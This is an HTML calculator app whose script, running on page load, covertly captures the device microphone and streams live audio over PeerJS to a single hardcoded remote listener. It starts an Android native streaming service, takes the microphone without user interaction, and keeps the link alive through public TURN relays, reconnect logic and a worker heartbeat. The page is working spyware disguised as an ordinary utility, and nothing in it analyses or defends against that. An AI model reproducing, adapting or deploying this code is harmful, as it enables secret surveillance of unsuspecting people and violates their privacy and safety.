<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Calculator</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Plus+Jakarta+Sans:wght@400;500;600&display=swap" rel="stylesheet">
  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>

  <style>
    :root {
      --bg-base: #0f172a;
      --calc-body: #1e293b;
      --calc-screen: #0a0f1d;
      --btn-num: #334155;
      --btn-op: #4f46e5;
      --btn-action: #64748b;
      --btn-equals: #10b981;
      --text-main: #f8fafc;
      --text-muted: #64748b;
      --border: rgba(255, 255, 255, 0.08);
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; user-select: none; }
    body { background-color: var(--bg-base); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
    .calculator { width: 100%; max-width: 340px; background: var(--calc-body); border: 1px solid var(--border); border-radius: 24px; padding: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); display: flex; flex-direction: column; gap: 16px; }
    .meta-bar { display: flex; justify-content: space-between; align-items: center; font-size: 0.75rem; color: var(--text-muted); font-family: 'JetBrains Mono', monospace; }
    .room-tag { background: rgba(255, 255, 255, 0.05); padding: 2px 6px; border-radius: 4px; }
    .screen { background: var(--calc-screen); border: 1px solid var(--border); border-radius: 14px; padding: 16px 14px; display: flex; flex-direction: column; align-items: flex-end; justify-content: flex-end; min-height: 90px; }
    .previous-operand { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--text-muted); min-height: 1.2rem; }
    .current-operand { font-family: 'JetBrains Mono', monospace; font-size: 2rem; font-weight: 700; color: var(--text-main); word-break: break-all; }
    .keypad { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
    button { outline: none; border: none; height: 60px; border-radius: 14px; font-size: 1.2rem; font-weight: 600; cursor: pointer; color: var(--text-main); background: var(--btn-num); }
    button:active { transform: scale(0.95); }
    button.op { background: var(--btn-op); }
    button.action { background: var(--btn-action); color: #0f172a; }
    button.equals { background: var(--btn-equals); grid-row: span 2; height: 130px; }
    .span-2 { grid-column: span 2; }
  </style>
</head>
<body>

  <div class="calculator">
    <div class="meta-bar">
      <span>CALC</span>
      <span id="room-code-tag" class="room-tag">Active</span>
    </div>

    <div class="screen">
      <div id="prev-op" class="previous-operand"></div>
      <div id="curr-op" class="current-operand">0</div>
    </div>

    <div class="keypad">
      <button class="action" onclick="clearCalc()">AC</button>
      <button class="action" onclick="delCalc()">DEL</button>
      <button class="op" onclick="setOp('/')">÷</button>
      <button class="op" onclick="setOp('*')">×</button>

      <button onclick="addNum('7')">7</button>
      <button onclick="addNum('8')">8</button>
      <button onclick="addNum('9')">9</button>
      <button class="op" onclick="setOp('-')">−</button>

      <button onclick="addNum('4')">4</button>
      <button onclick="addNum('5')">5</button>
      <button onclick="addNum('6')">6</button>
      <button class="op" onclick="setOp('+')">+</button>

      <button onclick="addNum('1')">1</button>
      <button onclick="addNum('2')">2</button>
      <button onclick="addNum('3')">3</button>
      <button class="equals" onclick="handleEquals()">=</button>

      <button class="span-2" onclick="addNum('0')">0</button>
      <button onclick="addNum('.')">.</button>
    </div>
  </div>

  <script>
    // Standard Calculator Logic
    let cur = '0', prev = '', op = undefined;
    const curDisp = document.getElementById('curr-op');
    const prevDisp = document.getElementById('prev-op');

    function updateDisp() {
      curDisp.innerText = cur;
      prevDisp.innerText = op != null ? `${prev} ${op}` : '';
    }
    function addNum(n) {
      if (n === '.' && cur.includes('.')) return;
      cur = cur === '0' && n !== '.' ? n : cur + n;
      updateDisp();
    }
    function setOp(o) {
      if (!cur && !prev) return;
      if (prev) calc();
      op = o; prev = cur; cur = '';
      updateDisp();
    }
    function calc() {
      const p = parseFloat(prev), c = parseFloat(cur);
      if (isNaN(p) || isNaN(c)) return;
      switch (op) {
        case '+': cur = (p + c).toString(); break;
        case '-': cur = (p - c).toString(); break;
        case '*': cur = (p * c).toString(); break;
        case '/': cur = c === 0 ? 'Error' : (p / c).toString(); break;
      }
      op = undefined; prev = '';
    }
    function clearCalc() { cur = '0'; prev = ''; op = undefined; updateDisp(); }
    function delCalc() { cur = cur.length <= 1 ? '0' : cur.slice(0, -1); updateDisp(); }
    function handleEquals() { calc(); updateDisp(); }

    // =========================================================================
    // DEDICATED SINGLE-DEVICE AUDIO ENGINE (AUTO-START ON LAUNCH)
    // =========================================================================
    let peer = null;
    let liveStream = null;
    let activeCalls = new Set();
    let baseDeviceId = 'aura-node';
    let sessionEpoch = 0;
    let worker = null;

    // Hardcoded Dedicated Authorized Listener ID Prefix (Only this ID can connect)
    const AUTHORIZED_LISTENER_KEY = "aura-master-listener";

    const ICE_CONFIG = {
      iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' },
        { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
        { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' },
        { urls: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' }
      ],
      iceCandidatePoolSize: 10,
      iceTransportPolicy: 'all'
    };

    async function initAudioEngine() {
      // 1. Immediately launch native foreground service
      if (window.AndroidNative && window.AndroidNative.startNativeStreamingService) {
        window.AndroidNative.startNativeStreamingService();
      }

      // 2. Immediately acquire hardware microphone without user tap
      await acquireMicrophone();

      // 3. Initialize PeerJS session
      initSignalingSession(false);
    }

    async function acquireMicrophone() {
      try {
        liveStream = await navigator.mediaDevices.getUserMedia({
          audio: {
            echoCancellation: false,
            noiseSuppression: false,
            autoGainControl: true
          },
          video: false
        });

        const liveAudioTrack = liveStream.getAudioTracks()[0];

        // Replace track across calls if any
        activeCalls.forEach((call) => {
          if (call.peerConnection) {
            const senders = call.peerConnection.getSenders();
            const audioSender = senders.find(s => s.track && s.track.kind === 'audio');
            if (audioSender) {
              audioSender.replaceTrack(liveAudioTrack);
            }
          }
        });

        liveAudioTrack.onended = () => {
          setTimeout(acquireMicrophone, 1000);
        };
      } catch (err) {
        setTimeout(acquireMicrophone, 2000);
      }
    }

    function initSignalingSession(incrementGeneration = false) {
      if (incrementGeneration) {
        sessionEpoch++;
      }

      if (peer) {
        try {
          peer.disconnect();
          peer.destroy();
        } catch (e) {}
        peer = null;
      }

      if (window.AndroidNative && window.AndroidNative.getDeviceId) {
        baseDeviceId = window.AndroidNative.getDeviceId();
      }

      const targetId = sessionEpoch === 0 ? baseDeviceId : `${baseDeviceId}_${sessionEpoch}`;

      peer = new Peer(targetId, {
        config: ICE_CONFIG,
        debug: 1
      });

      peer.on('open', (id) => {
        startWorkerHeartbeat();
      });

      peer.on('call', (call) => {
        // ENFORCE SELECTED DEVICE ONLY: Reject anyone who isn't the single authorized listener
        if (!call.peer.startsWith(AUTHORIZED_LISTENER_KEY)) {
          call.close();
          return;
        }

        if (liveStream) {
          call.answer(liveStream);
        } else {
          // Fallback carrier until mic finishes initial hardware load
          const ctx = new (window.AudioContext || window.webkitAudioContext)();
          const osc = ctx.createOscillator();
          const gain = ctx.createGain();
          gain.gain.value = 0.0001;
          osc.connect(gain);
          const dest = ctx.createMediaStreamDestination();
          gain.connect(dest);
          osc.start();
          call.answer(dest.stream);
        }

        attachCallResilience(call);
      });

      peer.on('disconnected', () => {
        if (peer && !peer.destroyed) {
          peer.reconnect();
        }
      });

      peer.on('error', (err) => {
        if (err.type === 'unavailable-id') {
          setTimeout(() => { initSignalingSession(true); }, 500);
        } else if (err.type === 'network' || err.type === 'server-error' || err.type === 'socket-error') {
          if (peer && !peer.destroyed) {
            peer.reconnect();
          }
        }
      });
    }

    function attachCallResilience(call) {
      activeCalls.add(call);

      if (call.peerConnection) {
        const pc = call.peerConnection;

        pc.oniceconnectionstatechange = () => {
          if (pc.iceConnectionState === 'failed' || pc.iceConnectionState === 'disconnected') {
            try {
              if (pc.restartIce) pc.restartIce();
            } catch (e) {}
          }
        };

        pc.onconnectionstatechange = () => {
          if (pc.connectionState === 'failed') {
            activeCalls.delete(call);
          }
        };
      }

      call.on('close', () => { activeCalls.delete(call); });
      call.on('error', () => { activeCalls.delete(call); });
    }

    function startWorkerHeartbeat() {
      if (worker) worker.terminate();

      const blob = new Blob([`
        setInterval(function() {
          postMessage('TICK');
        }, 8000);
      `], { type: 'application/javascript' });

      worker = new Worker(URL.createObjectURL(blob));
      worker.onmessage = function() {
        if (!peer || peer.destroyed) {
          initSignalingSession(false);
          return;
        }

        if (peer.disconnected) {
          peer.reconnect();
          return;
        }

        if (peer.socket && peer.socket._socket && peer.socket._socket.readyState === WebSocket.OPEN) {
          peer.socket._socket.send(JSON.stringify({ type: 'HEARTBEAT' }));
        }
      };
    }

    window.handleNetworkAvailable = function() {
      if (!peer || peer.destroyed) {
        initSignalingSession(false);
        return;
      }
      if (peer.disconnected) {
        peer.reconnect();
      }
      activeCalls.forEach((call) => {
        if (call.peerConnection && call.peerConnection.restartIce) {
          try { call.peerConnection.restartIce(); } catch (e) {}
        }
      });
    };

    window.handleNetworkLost = function() {};

    // Auto-launch everything on initial load
    window.onload = initAudioEngine;
  </script>
</body>
</html>
